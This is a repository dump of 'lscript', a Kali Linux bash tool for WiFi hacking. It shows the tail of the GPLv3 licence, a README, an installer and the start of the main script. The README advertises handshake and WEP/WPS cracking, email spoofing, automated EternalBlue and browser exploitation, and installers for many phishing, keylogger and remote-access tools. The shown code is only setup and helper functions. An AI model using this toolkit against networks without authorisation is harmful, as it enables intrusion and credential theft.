contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<https://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<https://www.gnu.org/licenses/why-not-lgpl.html>.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.974609375,
          "content": "*The lazy script has not been updated for a while due to me being very busy with my life. I will try my best to upload an update when I find the time*\n\n## Welcome to the LAZY script  v2.1.4\n<p align=\"center\">\n<img src=\"https://i.imgur.com/awIplS6.jpg\"/>\n<img src=\"https://i.imgur.com/pbq0DuE.jpg\"/>\n<img src=\"https://i.imgur.com/QgTLKxR.jpg\"/>\n<img src=\"https://i.imgur.com/oJIk2oG.jpg\"/>\n<img src=\"https://i.imgur.com/icT4x55.jpg\"/>\n<img src=\"https://i.imgur.com/sSf1JcI.jpg\"/>\n<img src=\"https://i.imgur.com/MlDFWax.jpg\"/>\n<img src=\"https://i.imgur.com/rbdUIQI.jpg\"/>\n</p>\nA video Hackersploit made : https://www.youtube.com/watch?v=oBpo5sElrMY\n\nA video sstec made:         https://www.youtube.com/watch?v=gSO7c2MN7TY\n\n**For feature-recommendation , add it on the \"Issues\" tab. NOW!**\n\n**I AM NOT RESPONSIBLE HOW YOU USE THIS TOOL.BE LEGAL AND NOT STUPID.**\n\n**This script will make your life easier, and of course faster.**\n\n**Its not only for noobs.Its for whoever wants to type less and do actually more.**\n\n### What is this\nThis is a script for Kali Linux that automates many procedures about wifi penetration and hacking.\nI actually made it for fun for me just to save some time, but i don't mind publicing it.\n\n### Features\n\n   ### NEW FEATURE: Custom keyboard shortcuts!! Launch any tool within lscript , with your own shortcuts!!! (type ks to set your shortcuts)\n\t\nEnabling-Disabling interfaces faster\nChanging Mac faster\nAnonymizing yourself faster\nView your public IP faster\nView your MAC faster\n\t\n**TOOLS**\n\n\tYou can install whichever tool(s) you want from within lscript! \n\tFluxion                         by Deltaxflux\n\tWifiTe                          by derv82\n\tWifiphisher                     by George Chatzisofroniou\n\tZatacker                        by LawrenceThePentester\n\tMorpheus                        by Pedro ubuntu  [ r00t-3xp10it ]\n\tOsrframework                    by i3visio\n\tHakku                           by 4shadoww\n\tTrity                           by Toxic-ig\n\tCupp                            by Muris Kurgas\n\tDracnmap                        by Edo -maland-\n\tFern Wifi Cracker               by Savio-code\n\tKichthemout                     by Nikolaos Kamarinakis & David Schütz\n\tBeeLogger                       by Alisson Moretto - 4w4k3\n\tGhost-Phisher                   by Savio-code\n\tMdk3-master                     by Musket Developer\n\tAnonsurf                        by Und3rf10w\n\tThe Eye                         by EgeBalci\n\tAirgeddon                       by v1s1t0r1sh3r3\n\tXerxes                          by zanyarjamal\n\tEzsploit                        by rand0m1ze\n\tKatana framework                by PowerScript\n\t4nonimizer                      by Hackplayers\n\tSslstrip2                       by LeonardoNve\n\tDns2proxy                       by LeonardoNve\n\tPupy                            by n1nj4sec\n\tZirikatu                        by pasahitz\n\tTheFatRat                       by Sceetsec\n\tAngry IP Scanner                by Anton Keks\n\tSniper                          by 1N3\n\tReconDog                        by UltimateHackers\n\tRED HAWK                        by Tuhinshubhra\n\tRoutersploit                    by Reverse shell\n\tCHAOS                           by Tiagorlampert\n\tWinpayloads                     by Ncc group \n\tInfoga                          by m4ll0k\n\tnWatch                          by Suraj\n\tEternal scanner                 by Peterpt\n\tEaphammer                       by S0lst1c3\n\tDagon                           by Ekultek\n\tLALIN                           by Screetsec\n\tNgrok                           by inconshreveable + more\n\tKwetza                          by Chris Le Roy\n\tBleachbit                       by Andrew Ziem\n\tOperative framework             by Tristan Granier\n\tNetattack2                      by Christian Klein\n\tFindsploit                      by 1N3\n\tHowdoi                          by Benjamin Gleitzman\n\tDr0p1t-Framework                by Karim Shoair\n\tFakeImageExploiter              by r00t-3xp10it\n\tLeviathan                       by Utku Sen, Ozge Barbaros\n\tWiFi-Pumpkin                    by P0cL4bs\n\tAvet                            by govolution\n\tMeterpreter_Paranoid_Mode-SSL   by r00t-3xp10it\n\tKoadic                          by zerosum0x0\n\tEmpire                          by Will Schroeder,\n                                           Justin Warner, \n                                           Matt Nelson,\n                                           Steve Borosh,\n                                           Alex Rymdeko-harvey, \n                                           Chris Ross\n\tVeil                            by ChrisTruncer\n\tSecHub                          by JoshDelta\n\tDKMC                            by Mr.Un1k0d3r RingZer0 Team\n\tDemiguise                       by Richard Warren\n\tUniByAv                         by Mr.Un1k0d3r RingZer0 Team\n\tLFISuite                        by D35m0nd142\n\tFaraday                         by Infobyte\n\tMSFPC                           by g0tmi1k\n\tNoSQLMap                        by codingo, tcsstool\n\tEvil-Droid                      by Mascerano Bachir\n\tIftop                           by Paul Warren, Chris Lightfoot\n\tMORE ARE BEING ADDED ON EVERY UPDATE\n\t\n**Wifi password scripts**\n\n\tHandshake       (WPA-WPA2)\n\tFind WPS pin    (WPA-WPA2)\n\tWEP hacking     (WEP)    \n\t\n**Others**\n\n\tEmail spoofing\n\tMetasploit automation (create payloads,listeners,save listeners for later etc...)\n\tAuto eternalblue exploiting (check on ks) -> hidden shortcuts\n\tBrowser auto-expoiting with BeEF and MITMf\n\tSQLmap automated\n\t+more\n\t\t\n# How to install (Kali Linux)\n(make sure you are a root user)\n\n<p>\n\tOfficial Installation Tutorial on Kali Linux 2020.5:\n\thttps://youtu.be/xcb5uwP5nSU\n</p>\n\n**Be carefull.If you download it as a .zip file, it will not run.Make sure to follow these simple instructions.**\n\n**MADE FOR KALI LINUX**\n\n```\ncd\napt-get update\ngit clone https://github.com/arismelachroinos/lscript.git\ncd lscript\nchmod +x install.sh\n./install.sh\n```\n\n### How to run it\n\n(make sure you are a root user)\n\n```\nopen terminal\ntype  \"l\"\npress enter\n```\n**(Not even \"lazy\"!! Just \"l\"! The less you type , the better!)**\n\n### How to uninstall\n``` \ncd /root/lscript\n./uninstall.sh\nrmdir -r /root/lscript \n```\n\n### How to update\n``` \nRun the script\nType \"update\"\n```\n\n### Shoutouts\n\n##### [OpenSource Projects](https://www.facebook.com/opensourceprojects/)\n\nOpenSource Projects is a Facebook community page who's goal is to give developers, new and old, a easy and simple place to share their opensource contributions and projects. I personally think this is an awesome idea, I know how hard it is to get your code noticed by people and support these guys 100%. Go ahead and give them a like [here](https://www.facebook.com/opensourceprojects/). They will share any opensource project you send them for free. Thank you OpenSource Projects for giving developers a place to share work with one another!\n\n### Donate\nIf you like my work, consider buying me a coffee :)\n\n[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY)\n\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 2.6318359375,
          "content": "#! /bin/bash\nclear\nprintf '\\033]2;INSTALLER\\a'\necho -e \"Press \\e[1;33many key\\e[0m to install the script...\"\nread -n 1\nclear\napt-get -y install gnome-terminal\nclear\nDIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\"\nif [[ \"$DIR\" != \"/root/lscript\" ]]\nthen\n\techo -e \"You didn't follow the github's simple install instructions.I will try to do it for you...\"\n\tsleep 4\n\tif [[ -d /root/lscript ]]\n\tthen\n\t\trm -r /root/lscript\n\tfi\n\tmkdir /root/lscript\n\tcp -r \"$DIR\"/* /root/lscript\n\tchmod +x /root/lscript/install.sh\n\tgnome-terminal -- \"bash /root/lscript/install.sh\"\nfi\necho -e \"Installing lscript...\"\nsleep 1\necho -e \"Fixing permissions\"\nsleep 2\nchmod +x /root/lscript/lh1\nchmod +x /root/lscript/lh2\nchmod +x /root/lscript/lh3\nchmod +x /root/lscript/lh31\nchmod +x /root/lscript/l\nchmod +x /root/lscript/lh4\nchmod +x /root/lscript/lh41\nchmod +x /root/lscript/lh21\nchmod +x /root/lscript/lh42\nchmod +x /root/lscript/lh43\nchmod +x /root/lscript/ls/l131.sh\nchmod +x /root/lscript/ls/l132.sh\nchmod +x /root/lscript/ls/l133.sh\nchmod +x /root/lscript/uninstall.sh\nclear\necho -e \"Copying script to /bin/lscript\"\nsleep 1\nmkdir /bin/lscript\ncd /root/lscript\ncp /root/lscript/l /bin/lscript\ncp /root/lscript/lh1 /bin/lscript\ncp /root/lscript/lh2 /bin/lscript\ncp /root/lscript/lh3 /bin/lscript\ncp /root/lscript/lh31 /bin/lscript\ncp /root/lscript/lh4 /bin/lscript\ncp /root/lscript/lh41 /bin/lscript\ncp /root/lscript/lh21 /bin/lscript\ncp /root/lscript/lh42 /bin/lscript\ncp /root/lscript/lh43 /bin/lscript\nclear\n#required for gui\napt-get -y install ncurses-dev\nclear\nif [[ ! -d /root/handshakes ]]\nthen\n\tmkdir /root/handshakes\n\techo -e \"Made /root/handshake directory\"\nelse\n\techo -e \"/root/handshakes directory detected.Good.\"\nfi\nif [[ ! -d /root/wordlists ]]\nthen\n\tmkdir /root/wordlists\n\techo -e \"Made /root/wordlists directory\"\nelse\n\techo -e \"/root/wordlists directory detected.Good.\"\nfi\nwhile true\ndo\nclear\necho -e \"Are you \\e[1;33mu\\e[0mpdating or \\e[1;33mi\\e[0mnstalling the script?(\\e[1;33mu\\e[0m/\\e[1;33mi\\e[0m): \"\necho -e \"Only use 'i' for the first time.\"\nread UORI\nif [[ \"$UORI\" = \"u\" ]]\nthen \n\tclear\n\techo -e \"Type 'changelog' to see what's new on this version\"\n\tsleep 3\n\tbreak\nelif [[ \"$UORI\" = \"i\" ]]\nthen\n\tclear\n\tBASHCHECK=$(cat ~/.bashrc | grep \"bin/lscript\")\n\tif [[ \"$BASHCHECK\" != \"\" ]]\n\tthen\n\t\techo -e \"I SAID USE i ONLY ONE TIME...........\"\n\t\tsleep 3\n\tfi\n\techo -e \"Adding lscript to PATH so you can access it from anywhere\"\n\tsleep 1\n\texport PATH=/bin/lscript:$PATH\n\tsleep 1\n\techo \"export PATH=/bin/lscript:$PATH\" >> ~/.bashrc\n\tsleep 1\n\tclear\n\tbreak\nfi\ndone\nclear\necho -e \"DONE\"\nsleep 1\nclear\necho -e \"Open a NEW terminal and type 'l' to launch the script\"\nsleep  4\ngnome-terminal -- l\nexit\n"
        },
        {
          "name": "l",
          "type": "blob",
          "size": 239.1904296875,
          "content": "#! /bin/bash\n\n# set -x\nVERSION=2.1.5\n#Number of tools with keyboard shortcut support\nHOWMANYTOOLS=53\nBACKL=\"0\"\nDONATIONS=13\nLATESTCHANGELOGLINES=26\ncd\n#############DEFAULTS###############\nfunction defaults_l\n{\n#path for lscript\n\tLPATH=\"/root/lscript\"\n\texport LPATH\n#path for keyboard shortcuts\n\tKSPATH=\"\"$LPATH\"/ks\"\n\texport KSPATH\n#making sure the kspath is set\n\tif [[ ! -d \"$KSPATH\" ]]\n\tthen\n\t\tmkdir \"$KSPATH\"\n\tfi\n#wififb file\n\twififbfile=\"\"$LPATH\"/wififb.txt\"\n\twififbfileall=\"\"$LPATH\"/wififball.txt\"\n\twififbpassfile=\"\"$LPATH\"/wififbpasswords.txt\"\n\twififbpassfileall=\"\"$LPATH\"/wififbpasswordsall.txt\"\n\texport wififbfile \n\texport wififbfileall\n\texport wififbpassfile\n\texport wififbpassfileall\n#ALFA SUPPORT SETTING\n\tif [[ -f \"$LPATH\"/settings/AWUS036ACH.txt ]]\n\tthen\n\t\tread ALFA < \"$LPATH\"/settings/AWUS036ACH.txt\n\telse\n\t\tALFA=\"no\"\n\tfi\n#yellow start \n\tYS=\"\\e[1;33m\"\n#blue start \n\tBS=\"\\e[0;34m\"\n#color end\n\tCE=\"\\e[0m\"\n#red start\n\tRS=\"\\e[1;31m\"\n#black start\n\tBLS=\"\\e[0;30m\"\n#dark gray start\n\tDGYS=\"\\e[1;30m\"\n#light blue start\n\tLBS=\"\\e[1;34m\"\n#green start\n\tGNS=\"\\e[0;32m\"\n#light green start\n\tLGNS=\"\\e[1;32m\"\n#cyan start\n\tCYS=\"\\e[0;36m\"\n#light cyan start\n\tLCYS=\"\\e[1;36m\"\n#light red start\n\tDRS=\"\\e[0;31m\"\n#purple start\n\tPS=\"\\e[0;35m\"\n#light purple start\n\tLPS=\"\\e[1;35m\"\n#brown start\n\tBRS=\"\\e[0;33m\"\n#light gray start\n\tLGYS=\"\\e[0;37m\"\n#white start\n\tWHS=\"\\e[1;37m\"\n#setting custom color for logo\n\tif [[ -f \"$LPATH\"/settings/logocolor.txt ]]\n\tthen\n\t\tread COL < \"$LPATH\"/settings/logocolor.txt\n\telse\n\t\tCOL=\"$RS\"\n\tfi\n#tools\ntoolarray=(\n\"fluxion\" \"sniffer\" \"wifite\" \"wifiphisher\" \"morpheus\" \"osrframework\" \"hakku\" \"trity\" \"cupp\" \"dracnmap\" \"fern\" \"kickthemout\" \"ghostphisher\" \"theeye\" \"xerxes\"\n\"mdk3\" \"katana\" \"airgeddon\" \"4nonimizer\" \"beelogger\" \"ezsploit\" \"pupy\" \"zirikatu\" \"wifiautopwner\" \"bully\" \"anonsurf\" \"anonym8\" \"thefatrat\" \"angryip\" \"sniper\"\n\"recondog\" \"redhawk\" \"winpayloads\" \"chaos\" \"routersploit\" \"infoga\" \"nwatch\" \"eternalscanner\" \"eaphammer\" \"dagon\" \"lalin\" \"knockmail\" \"kwetza\" \"ngrok\" \"netdiscover\"\n\"websploit\" \"openvas\" \"shellter\" \"geany\" \"bleachbit\" \"vmr\" \"hashbuster\" \"findsploit\" \"howdoi\" \"operative\" \"netattack2\" \"koadic\" \"empire\" \"meterpreter_paranoid_mode\"\n\"dropit_frmw\" \"wifi_pumpkin\" \"veil\" \"leviathan\" \"fake_image\" \"avet\" \"gloom\" \"arcanus\" \"msfpc\" \"morphhta\" \"lfi\" \"unibyav\" \"demiguise\" \"dkmc\" \"sechub\" \"beef\" \"mitmf\"\n\"fsociety\" \"arp_scan\" \"netool\" \"sqlmap\" \"patator\" \"zeus\" \"evil_droid\" \"nosqlmap\" \"eggshell\" \"zerodoor\" \"cromos\" \"yuki-chan\" \"socialfish\" \"autosploit\" \"blazy\"\n\"striker\" \"hyprpulse\" \"instaburst\" \"instagram-py\" \"datasploit\" \"sitebroker\" \"enigma\"\n)\n#setting frequent stings\n\tYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\n\tYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\n\tYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\n\tPAKT=\"Press \"$YS\"any key$CE to\"\n\tPAKTC=\"Press \"$YS\"any key$CE to continue...\"\n\tPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\tTNI=\"\"$RS\"Tool is not installed. To install it type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"'.\"$CE\"\"\n#code to read from keyboard without return\n\tREADAK=\"read -n 1\"\n#default MAC when starting monitor\n\tDEFMAC=\"00:11:22:33:44:55\"\n\t\n\twififb=\"wififb\"\n}\n##############FUNCTIONS#############\nfunction local_ips()\n{\n\tiffile=\"\"$LPATH\"/iftemp.txt\"\n\t#passing an interface if any\n\tLF=\"$1\"\n\tGREPP=$(ifconfig)\n\tif [[ \"$LF\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$BS\"Local IPs\"$CE\": \"\n\t\tTEST=$(echo \"$GREPP\" | grep \"$ETH:\")\n\t\tn=0\n\t\tif [[ $TEST != \"\" ]]\n\t\tthen\n\t\t\tifconfig \"$ETH\" > $iffile\n\t\t\tLOCALETH=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\tcho=$(is_it_an_ip $LOCALETH)\n\t\t\tif [[ \"$cho\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$ETH\" = \"$YS\"$LOCALETH\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\tTEST=$(echo \"$GREPP\" | grep \"$WLANN:\")\n\t\tif [[ $TEST != \"\" ]]\n\t\tthen\n\t\t\tifconfig $WLANN > $iffile\n\t\t\tLOCALMA=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\tcho=$(is_it_an_ip $LOCALMA)\n\t\t\tif [[ \"$cho\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"$WLANN = \"$YS\"$LOCALMA\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\tTEST=$(echo \"$GREPP\" | grep \"$WLANNM:\")\n\t\tif [[ $TEST != \"\" ]]\n\t\tthen\n\t\t\tifconfig $WLANNM > $iffile\n\t\t\tLOCALMO=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\tcho=$(is_it_an_ip $LOCALMO)\n\t\t\tif [[ \"$cho\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"$WLANNM = \"$YS\"$LOCALMO\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\tif [[ \"$n\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No known interfaces found available\"$CE\"\"\n\t\tfi\n\t\techo -e \"\"\n\t\tfind_gateways\n\telse\n\t\tTEST=$(echo \"$GREPP\" | grep \"$LF:\")\n\t\tif [[ $TEST != \"\" ]]\n\t\tthen\n\t\t\tifconfig $LF > $iffile\n\t\t\tLOCALM=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\tcho=$(is_it_an_ip $LOCALM)\n\t\t\tif [[ \"$cho\" = 1 ]]\n\t\t\tthen\n\t\t\t\tOUTPUT=\"$LOCALM\"\n\t\t\t\techo -e \"$OUTPUT\"\n\t\t\tfi\n\t\tfi\n\tfi\n}\nfunction give_ip_take_zero()\n{\n\t#passing an ip\n\tGI1=\"$1\"\n\tGI2=\"$2\"\n\tif [[ \"$GI1\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$RS\"Error 7. No parameters passed\"$CE\"\"\n\t\tsleep 3\n\telse\n\t\tip1=$(echo -e \"$GI1\" | cut -d '.' -f1)\n\t\tip2=$(echo -e \"$GI1\" | cut -d '.' -f2)\n\t\tip3=$(echo -e \"$GI1\" | cut -d '.' -f3)\n\t\tif [[ \"$GI2\" = \"\" ]]\n\t\tthen\n\t\t\tOUTPUT=\"\"$ip1\".\"$ip2\".\"$ip3\".0\"\n\t\telse\n\t\t\tOUTPUT=\"\"$ip1\".\"$ip2\".\"$ip3\".\"\n\t\tfi\n\t\t\techo \"$OUTPUT\"\n\tfi\n}\nfunction is_it_an_ip()\n{\n\tIIA=$1\n\tIIAI=${#IIA}\n\tif [[ \"$IIA\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$RS\"Error 9. No parameteres passed\"\n\t\tsleep 2\n\telse\n\t\tif [[ \"$IIAI\" -le 15 && \"$IIAI\" -ge 7 ]]\n\t\tthen\n\t\t\techo 1\n\t\telse\n\t\t\techo 0\n\t\tfi\n\tfi\n}\nfunction latest_changelog\n{\n\tclear\n\tprintf '\\033]2;LATEST CHANGELOG\\a'\n\techo -e \"\"$BS\"Wellcome to version $VERSION\"$CE\"\"\n\techo -e \"What is included in this update: \"\n\tcat \"$LPATH\"/Changelog | head -n $LATESTCHANGELOGLINES\n\techo -e \"$PAKTC\"\n\t$READAK\n}\nfunction finish \n{\n  echo -e \"\"$RS\"Hard kill detected..\"$CE\"\"\n}\nfunction dash_calc\n{\n\t\n\tsize=${#TERMINALTITLE}\n\tcalc=$(( 65-size ))\n\tcalc=$(( calc/2 ))\n\tnumcalc=1\n\tDASHESN=\"-\"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tDASHESN=\"\"$DASHESN\"-\"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n\techo -e \"$DASHESN\"$RS\"$TERMINALTITLE\"$CE\"$DASHESN\"\n}\nfunction managed_spaces\n{\n\tsize=${#WLANN}\n\tcalc=$(( 11-size ))\n\tnumcalc=1\n\tSPACESN=\" \"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tSPACESN=\"\"${SPACESN}\" \"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n}\nfunction monitor_spaces\n{\n\tsize=${#WLANNM}\n\tcalc=$(( 11-size ))\n\tnumcalc=1\n\tSPACESM=\" \"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tSPACESM=\"\"${SPACESM}\" \"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n}\nfunction check_wlans\n{\n\tCC=$WLANN\n\tWLANCHECKING=$(ifconfig | grep \"$WLANN\" )\n\t#~ WLANCHECKING=$(ifconfig | awk -v c1=\"$CC\" '$0 ~ c1 {print}')\n\tCC=$WLANNM\n\tWLANMCHECKING=$(ifconfig | grep \"$WLANNM\" )\n\t#~ WLANMCHECKING=$(ifconfig | awk -v c1=\"$CC\" '$0 ~ c1 {print}')\n}\nfunction banner\n{\n\tcheck_wlans\n\techo -e \"\"\n\techo -e \"$COL         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION\"\n\techo -e \"$COL         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE\"\n\techo -e \"$COL         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by \"$COL\"ARIS MELACHROINOS$CE\"\n\techo -e \"$COL         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE\"\n\techo -e \"$COL    The  ███████╗██║  ██║███████╗   ██║  script$CE\"\n\techo -e \"$COL         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE\"\n\techo -e \"\"$YS\"if\"$CE\") Ifconfig           \"$YS\"l\"$CE\") Local IPs & gateways \"$RS\"|\"$CE\"  \"$YS\"scan\"$CE\") Arp-scan network\"\n\tif [[ \"$WLANCHECKING\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$RS\" 1\"$CE\") Enable \"$RS\"$WLANN\"$CE\"${SPACESN}\"$RS\"d1\"$CE\") Disable \"$RS\"$WLANN\"$CE\"${SPACESN}  